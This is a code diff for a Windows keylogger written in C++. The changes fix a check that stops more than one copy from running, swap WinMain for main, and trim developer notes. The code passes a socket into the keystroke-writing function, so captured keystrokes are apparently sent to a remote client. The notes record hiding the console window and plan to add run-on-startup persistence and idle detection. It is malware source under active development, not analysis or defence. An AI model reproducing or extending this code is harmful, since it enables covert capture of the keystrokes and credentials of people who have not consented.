@@ -32,7 +32,6 @@ int retrieveProcessName(DWORD procID, char mainProcName[])
         GetModuleBaseNameA(procHandle, hMod, procName, sizeof(procName)/sizeof(char));
     } 
     std::cout << procName << " " << mainProcName << "\n";
-    //std::cout << strcmp(mainProcName, procName) << "\n";
     if (strcmp(mainProcName, procName) == 0)  
     {
         keyloggerInstanceCounter++;
@@ -61,6 +60,7 @@ int isProcRunning()
     {
         GetModuleBaseNameA(mainProcHandle, hmModule, mainProcName, sizeof(mainProcName)/sizeof(char));
         std::cout << GetLastError();
+        
     }
     CloseHandle(mainProcHandle);
     EnumProcesses(procIDs, sizeof(procIDs), &cbNeeded);
@@ -68,7 +68,10 @@ int isProcRunning()
     //return 1;
     for (int i = 1; procIDs[i] != 0; i++) 
     {
-        retrieveProcessName(procIDs[i], mainProcName);
+        if (retrieveProcessName(procIDs[i], mainProcName)) 
+        {
+            return 1;
+        }
     }
     return 0;
 }
@@ -93,11 +96,10 @@ void writeKeyStroke(int trueKey, SOCKET sObjC)
     file.close();
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
-    PSTR lpCmdLine, int nCmdShow)
+int main()
 {
-    isProcRunning();
-    return 1;
+    if (isProcRunning()) { return 1; }
+    //return 1;
     Maps vkMaps;
     SOCKET sObjClient = initClient();
     vkMaps.initializeMaps();
@@ -137,24 +139,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 /*
         Notes
     
-    test results and conclusion: 
-        * console window shows on w10 vm, closing still keeps the process running though. - SOLVED: Using compiler option -mwindows
-        * keylogger can run multiple instances, not only does this cause performance issues, but also ruins the integrity of the data.
-    
     so far, these are the only issues I've found during testing. That and additional dll files are needed to run
     independently. 
     
         To-Do list
-    ~ create a function to check if the code program is already running. 
-        todo: fix code in isProcRunning so that mainProcName is getting data assigned by GetModuleBaseNameA(). 
-            update: I found the bug that is replacing main.exe with a ? inside of isProcRunning(), turns out that if i do not place
-            a return statement under the function call to isProcRunning(), it writes a ? to the c string mainProcName. 
-            A fix is still pending as I've not found a solution to the problem, I will work towards creating a fix.
-
     ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
     ~ write code to schedule this program to be run on startup.
     ~ implement code algorithm to check if user is idle, if so then exit the loop and wait til mouse moves.
-    ~ find a way to decrease cpu usage. 
+    ~ remove unnecessary apis from includes section. 
 
         Ideas
     ~ implement code to check if user is idle, if so then exit the loop and wait til mouse moves. 
